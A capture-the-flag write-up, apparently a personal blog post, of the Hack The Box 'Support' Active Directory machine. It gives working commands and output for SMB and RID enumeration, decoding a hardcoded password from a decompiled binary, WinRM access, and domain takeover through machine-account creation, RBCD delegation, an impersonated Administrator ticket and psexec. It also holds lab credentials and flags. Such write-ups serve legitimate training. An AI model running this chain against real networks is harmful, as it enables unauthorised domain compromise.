# Support (HTB)
![image](https://github.com/user-attachments/assets/ac97c5d6-4cb5-4755-80a5-d2809300a58c)

*Target IP: 10.10.11.174*

---
An easy box, no doubt — but given my current "entry-level" status, it took me an entire Sunday to conquer this intriguing challenge!

Let me start with a quick disclaimer! I'm currently preparing for the PJPT exam by TCM Security (focused on Active Directory hacking), so every time I come across a machine or a lab that involves AD, I jump on it as a way to sharpen my skills for the real thing.

That said, it’s worth noting that a challenge like this is quite different from what you’d encounter on the PJPT exam. I didn’t dig into every single possible vulnerability — after all, this is a CTF. My approach was to find the most efficient path to capture the required flags.

But enough talking — let’s get to it!

---



## Nmap
As usual, I start off with a solid Nmap scan — the best way to uncover interesting paths and potential vulnerabilities to exploit.
I immediately go for a full port scan, since I like to run other enumeration tasks in parallel while it completes — especially when I already know from the get-go that I’m dealing with a Windows environment, and more specifically, an Active Directory domain.

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania]
└─$ nmap -p- -T4 -sC -sV 10.10.11.174          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 09:07 CEST
Nmap scan report for 10.10.11.174
Host is up (0.043s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-06 07:10:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49737/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-06T07:11:47
|_  start_date: N/A
|_clock-skew: 1m10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 237.22 seconds
```

The scan confirms we're dealing with an AD environment and also reveals the domain name — `support.htb` — which we had already suspected. 
We’ll go ahead and add it to our `/etc/hosts` file right away:

```bash
sudo nano /etc/hosts
```
Let's add:
```bash
10.10.11.174  support.htb
```
---

As mentioned earlier, while Nmap was running, I started exploring other enumeration paths in parallel:

## Enum4linux-ng

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania]
└─$ enum4linux-ng 10.10.11.174  
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.174
[*] Username ......... ''
[*] Random Username .. 'hokouvgi'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Listener Scan on 10.10.11.174    |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for 10.10.11.174    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: support.htb

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for 10.10.11.174    |
 ===========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =========================================
|    SMB Dialect Check on 10.10.11.174    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                          
  SMB 1.0: false                                                                                                                                             
  SMB 2.02: true                                                                                                                                             
  SMB 2.1: true                                                                                                                                              
  SMB 3.0: true                                                                                                                                              
  SMB 3.1.1: true                                                                                                                                            
Preferred dialect: SMB 3.0                                                                                                                                   
SMB1 only: false                                                                                                                                             
SMB signing required: true                                                                                                                                   

 ===========================================================
|    Domain Information via SMB session for 10.10.11.174    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                                                                                                    
NetBIOS domain name: SUPPORT                                                                                                                                 
DNS domain: support.htb                                                                                                                                      
FQDN: dc.support.htb                                                                                                                                         
Derived membership: domain member                                                                                                                            
Derived domain: SUPPORT                                                                                                                                      

 =========================================
|    RPC Session Check on 10.10.11.174    |
 =========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'hokouvgi', password ''
[H] Rerunning enumeration with user 'hokouvgi' might give more results

 ===================================================
|    Domain Information via RPC for 10.10.11.174    |
 ===================================================
[+] Domain: SUPPORT
[+] Domain SID: S-1-5-21-1677581083-3380853377-188903654
[+] Membership: domain member

 ===============================================
|    OS Information via RPC for 10.10.11.174    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                     
OS version: '10.0'                                                                                                                                           
OS release: ''                                                                                                                                               
OS build: '20348'                                                                                                                                            
Native OS: not supported                                                                                                                                     
Native LAN manager: not supported                                                                                                                            
Platform id: null                                                                                                                                            
Server type: null                                                                                                                                            
Server type string: null            
```
Using `enum4linux-ng`, we gather some very interesting information — for instance, both LDAP and SMB are accessible, although SMBv1 is not supported.

We also identify the fully qualified domain name (FQDN), which will be a key element in this walkthrough:  
`dc.support.htb`

In addition, we confirm the availability of RPC sessions and retrieve the domain SID.

All of this gives us a solid starting point for further enumeration!

---

## SMB: A Promising Entry Point

A key service — and almost certainly our initial access point — is **SMB**.  
Generally, it's one of the first things I check: more often than not, there are shared folders available — and sometimes even accessible without authentication!

So instead of sticking strictly to a port-by-port methodology, I prefer to jump straight into the juiciest target and only fall back to more structured enumeration if needed.  
That’s my usual approach for CTFs: in a real-world penetration test, of course, it’s crucial to go step by step and identify **all** potential vulnerabilities.
Let's use the amazing **crackmapexec**:

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania]
└─$ crackmapexec smb 10.10.11.174 -u 'guest' -p '' --shares
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [+] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share
```
As expected, we’ve already discovered some shares — but wait, isn’t there something unusual and unusually interesting about them...?  
Well, before we get into what I’m referring to, let’s move forward with `crackmapexec` and see if we can pull out any user information!

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania]
└─$ crackmapexec smb 10.10.11.174 -u 'guest' -p '' --rid-brute
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [+] Brute forcing RIDs
SMB         10.10.11.174    445    DC               498: SUPPORT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               500: SUPPORT\Administrator (SidTypeUser)
SMB         10.10.11.174    445    DC               501: SUPPORT\Guest (SidTypeUser)
SMB         10.10.11.174    445    DC               502: SUPPORT\krbtgt (SidTypeUser)
SMB         10.10.11.174    445    DC               512: SUPPORT\Domain Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               513: SUPPORT\Domain Users (SidTypeGroup)
SMB         10.10.11.174    445    DC               514: SUPPORT\Domain Guests (SidTypeGroup)
SMB         10.10.11.174    445    DC               515: SUPPORT\Domain Computers (SidTypeGroup)
SMB         10.10.11.174    445    DC               516: SUPPORT\Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               517: SUPPORT\Cert Publishers (SidTypeAlias)
SMB         10.10.11.174    445    DC               518: SUPPORT\Schema Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               519: SUPPORT\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               520: SUPPORT\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.174    445    DC               521: SUPPORT\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               522: SUPPORT\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               525: SUPPORT\Protected Users (SidTypeGroup)
SMB         10.10.11.174    445    DC               526: SUPPORT\Key Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               527: SUPPORT\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               553: SUPPORT\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.174    445    DC               571: SUPPORT\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.174    445    DC               572: SUPPORT\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.174    445    DC               1000: SUPPORT\DC$ (SidTypeUser)
SMB         10.10.11.174    445    DC               1101: SUPPORT\DnsAdmins (SidTypeAlias)
SMB         10.10.11.174    445    DC               1102: SUPPORT\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.174    445    DC               1103: SUPPORT\Shared Support Accounts (SidTypeGroup)
SMB         10.10.11.174    445    DC               1104: SUPPORT\ldap (SidTypeUser)
SMB         10.10.11.174    445    DC               1105: SUPPORT\support (SidTypeUser)
SMB         10.10.11.174    445    DC               1106: SUPPORT\smith.rosario (SidTypeUser)
SMB         10.10.11.174    445    DC               1107: SUPPORT\hernandez.stanley (SidTypeUser)
SMB         10.10.11.174    445    DC               1108: SUPPORT\wilson.shelby (SidTypeUser)
SMB         10.10.11.174    445    DC               1109: SUPPORT\anderson.damian (SidTypeUser)
SMB         10.10.11.174    445    DC               1110: SUPPORT\thomas.raphael (SidTypeUser)
SMB         10.10.11.174    445    DC               1111: SUPPORT\levine.leopoldo (SidTypeUser)
SMB         10.10.11.174    445    DC               1112: SUPPORT\raven.clifton (SidTypeUser)
SMB         10.10.11.174    445    DC               1113: SUPPORT\bardot.mary (SidTypeUser)
SMB         10.10.11.174    445    DC               1114: SUPPORT\cromwell.gerard (SidTypeUser)
SMB         10.10.11.174    445    DC               1115: SUPPORT\monroe.david (SidTypeUser)
SMB         10.10.11.174    445    DC               1116: SUPPORT\west.laura (SidTypeUser)
SMB         10.10.11.174    445    DC               1117: SUPPORT\langley.lucy (SidTypeUser)
SMB         10.10.11.174    445    DC               1118: SUPPORT\daughtler.mabel (SidTypeUser)
SMB         10.10.11.174    445    DC               1119: SUPPORT\stoll.rachelle (SidTypeUser)
SMB         10.10.11.174    445    DC               1120: SUPPORT\ford.victoria (SidTypeUser)
SMB         10.10.11.174    445    DC               2601: SUPPORT\MANAGEMENT$ (SidTypeUser)
```

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania]
└─$ grep "(SidTypeUser)" support_rid.txt | sed -n 's/.*SUPPORT\\\(.*\)(SidTypeUser).*/\1/p'
Administrator 
Guest 
krbtgt 
DC$ 
ldap 
support 
smith.rosario 
hernandez.stanley 
wilson.shelby 
anderson.damian 
thomas.raphael 
levine.leopoldo 
raven.clifton 
bardot.mary 
cromwell.gerard 
monroe.david 
west.laura 
langley.lucy 
daughtler.mabel 
stoll.rachelle 
ford.victoria 
MANAGEMENT$ 

```

We hit the jackpot! We've found a nice list of domain users. Let’s make sure to save them in a text file, just in case we need them later for further enumeration or even for potential attacks.

Once that’s done, let’s head back to the shares (which we can also review using `smbclient` — just to offer a valid alternative):

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania]
└─$ smbclient -L //10.10.11.174 
Password for [WORKGROUP\uriel-sg]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
```

So, what's unusual about the shares? Well, not all of them are the usual ones.  
We come across a particularly interesting folder, and due to its uniqueness, it’s going to be the first one we target — no fear, no hesitation!
I’m referring to the `support-tools` folder, which **definitely** holds something intriguing inside.  
It stands out as a likely treasure trove of useful information or tools, and it's our next target!

---

### Dive into support-tools directory

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania]
└─$ smbclient //10.10.11.174/support-tools -c 'recurse;ls'
Password for [WORKGROUP\uriel-sg]:
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

                4026367 blocks of size 4096. 965357 blocks available
```
I usually add the `-c` flag to the `recurse;ls` command, so I can explore the contents of the folder and all its subdirectories in one go.  
In this case, it wouldn't have been necessary. Inside `support-tools`, we find... Well, just support tools! At first glance, nothing too exciting.  

However, upon a closer inspection, I noticed something unusual. While most of the tools are well-known, legitimate software, there’s one that stands out: **UserInfo.exe.zip**!

That’s definitely worth taking a closer look at.

---

### UserInfo.exe.zip

After extracting the ZIP file and analyzing its contents, I had a strong feeling there might be something interesting — maybe even crucial — inside the `.exe` file.

However, using tools like `xxd` or simply `strings`, I wasn’t getting anything meaningful. So, I decided to take the next logical step: **decompilation**.

I found a great tool for the job — **JetBrains dotPeek**, installed it on my Windows machine, and transferred the suspicious `.exe` over.

After poking around the decompiled code for a bit... I stumbled upon something *incredibly* interesting!
Let's take a look:

```c
// Decompiled with JetBrains decompiler
// Type: UserInfo.Services.Protected
// Assembly: UserInfo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCB9A7C1-A11B-4288-B919-CBDD9ABA8CA4
// Assembly location: C:\Users\salva\Downloads\UserInfo.exe

using System;
using System.Text;

#nullable disable
namespace UserInfo.Services
{
  internal class Protected
  {
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
      byte[] numArray = Convert.FromBase64String(Protected.enc_password);
      byte[] bytes = numArray;
      for (int index = 0; index < numArray.Length; ++index)
        bytes[index] = (byte) ((int) numArray[index] ^ (int) Protected.key[index % Protected.key.Length] ^ 223);
      return Encoding.Default.GetString(bytes);
    }
  }
}

```

See that? We’ve found an **encoded password**:  
`0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`

…along with its **decryption key**:  
`armando`

To decode the password, I asked ChatGPT for a little help — and to my great satisfaction, it pointed me to a simple and effective Python script:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

decoded = base64.b64decode(enc_password)
cleartext = bytearray()

for i in range(len(decoded)):
    cleartext.append(decoded[i] ^ key[i % len(key)] ^ 223)

print(cleartext.decode())
```

Result:

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

We're not done yet! So, what can we actually do with this password? What’s it for?

Digging a bit deeper with **dotPeek**, I came across something **even more interesting**...

![Screenshot_2025-04-06_151344](https://github.com/user-attachments/assets/357b965d-9dec-4fd6-89d5-238e7e8a03a6)

In the decompiled code, we find a **clear reference to an LDAP query**, along with a specific username:  
**`support`** — which just so happens to be one of the users we discovered earlier!

Naturally, the next logical step is to use these credentials to perform an **LDAP query** and see what we can extract. Let's go!

```bash
ldapsearch -x -H ldap://10.10.11.174 -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(sAMAccountName=support)"
```

Result:

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania/support/userinfo]
└─$ ldapsearch -x -H ldap://10.10.11.174 -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(sAMAccountName=support)"
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (sAMAccountName=support)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20250406093934.0Z
uSNCreated: 12617
**info: Ironside47pleasure40Watchful**
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 86141
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 3
codePage: 0
countryCode: 0
badPasswordTime: 133884186150257695
lastLogoff: 0
lastLogon: 133884178740882069
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133884059744319606

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```

At first glance, the LDAP query returns what looks like just a **bunch of generic information**. Nothing too special...

But then — wait a second — did you notice the **`info`** field?

In “info”, we found support’s PASSWORD:

```bash
Ironside47pleasure40Watchful
```

We’ve got a **username** and a **password** — finally, our first set of valid credentials.

At this point, we could restart our enumeration phase, maybe even run **BloodHound** to gather as much information as possible about the environment and uncover any exploitable relationships...

But hey — this is a **CTF**, after all. So you know what that means:

👉 Let’s go straight for a **shell**!


```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania/support]
└─$ evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> 

```

***First flag found!***

```bash
*Evil-WinRM* PS C:\Users\support\Desktop> ls

    Directory: C:\Users\support\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          4/5/2025   5:58 PM             34 user.txt

*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
**655f85da92a219613052d7ac047cb9f0**
```

Boom — just as expected, the **first flag is ours**.  
Now, it’s time to escalate privileges and **own the Domain Controller**.

Sounds easy, right?  
Yeah… not so much.

## Privilege Escalation

I spent **hours** on the privilege escalation part. Tried everything I could think of — I uploaded **WinPEAS**, analyzed every bit of info and every potential vulnerability it reported.  
I ran **Mimikatz**, spun up a **Meterpreter** session, even used **Metasploit’s local exploit suggester**...  
Nothing.

```bash
#   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
 6   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022
 7   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.

```

I was completely stuck — until I realized that the answer had been **right in front of me**

## A Moment of Clarity

At some point I stopped and thought:  
**"Wait a second... I already have a shell and a valid user. Why not just check my privileges with a good easy old-fashioned `whoami /priv`?"**

Sometimes, the simplest commands are the most revealing — and that was exactly the case here.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

Right away, the **first entry** in the output of `whoami /priv` grabbed my attention.  
I didn’t even need to look up what it was — the **description** in the terminal already explained its purpose clearly.

That was my "Aha!" moment.

After a bit of research on how this privilege could allow the creation of a **new workstation in a domain**, I found the perfect path forward.  
It led me to a **straightforward yet powerful** privilege escalation method.

## Privilege Escalation: The Missing Piece

First let's add a workstation:

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania/support]
└─$ impacket-addcomputer -computer-name 'urielsg-PC$' -computer-pass 'Urielsg!' -dc-ip 10.10.11.174 SUPPORT.htb/support:Ironside47pleasure40Watchful  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account urielsg-PC$ with password Urielsg!.
```

Let’s configure RBCD on the new PC!

🧠 What is RBCD?
RBCD stands for Resource-Based Constrained Delegation.
It's a Windows Active Directory feature that allows a computer account to impersonate users when accessing specific services on another machine — but only if explicitly permitted by the target machine.
With RBCD, the permission is set on the target machine's computer object, allowing it to trust another machine's account to delegate.

RBCD is often used legitimately in enterprise environments, but it can also be abused by attackers — especially if the attacker can create or control a computer account in the domain!

So, we are ready to go now:

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania/support]
└─$ impacket-rbcd -delegate-to 'dc$' -delegate-from 'urielsg-PC$' -dc-ip 10.10.11.174 -action write SUPPORT.htb/support:Ironside47pleasure40Watchful 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] urielsg-PC$ can now impersonate users on dc$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     urielsg-PC$   (S-1-5-21-1677581083-3380853377-188903654-5601)
```

Let’s break it down:

![image](https://github.com/user-attachments/assets/acf848cf-6a33-4e6e-851e-0fb342a3b186)

## Service Ticket

We have created a new workstation, configured RBCD (Resource-Based Constrained Delegation), and now all that remains is to request a Service Ticket (ST) and officially impersonate the Administrator to obtain a shell and capture our wonderful flag.

So, let’s request a service ticket (ST) using, again, the amazing `impacket`:

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania/support]
└─$ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 SUPPORT.htb/urielsg-PC:Urielsg!
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

**Service Ticket successfully generated!**
At this point, I realized I didn't have any Kerberos-related tools on my Kali machine. I proceeded to install `krb5-user` to properly utilize the generated ticket:

```
sudo apt install krb5-user -y
```

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania/support]
└─$ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

To verify that everything went smoothly, I ran `klist` to display the current Kerberos tickets in the cache:

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania/support]
└─$ klist
Ticket cache: FILE:Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
Default principal: Administrator@SUPPORT.htb

Valid starting       Expires              Service principal
07/04/2025 00:37:22  07/04/2025 10:37:22  cifs/dc.support.htb@SUPPORT.HTB
        renew until 08/04/2025 00:37:09

```

## FINAL SHOT

Now that we have our ticket, we're ready to concretely impersonate the Administrator by attempting to obtain a shell with psexec. Will it work...?

**Let’s try!**

```bash
┌──(uriel-sg㉿Uriel-SG)-[~/Scrivania/support]
└─$ impacket-psexec -k -no-pass SUPPORT.htb/Administrator@dc.support.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file JxMXhqkr.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service lPXa on dc.support.htb.....
[*] Starting service lPXa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```

**BOOM!**
Privileged shell obtained and... 

```bash
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users\Administrator\Desktop

05/28/2022  04:17 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          ..
04/06/2025  11:02 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,961,876,480 bytes free
```

```bash
C:\Users\Administrator\Desktop> type root.txt
6f6d4e2b460c3ad5b8d140ec74024232
```

**FLAG FOUND!**

---
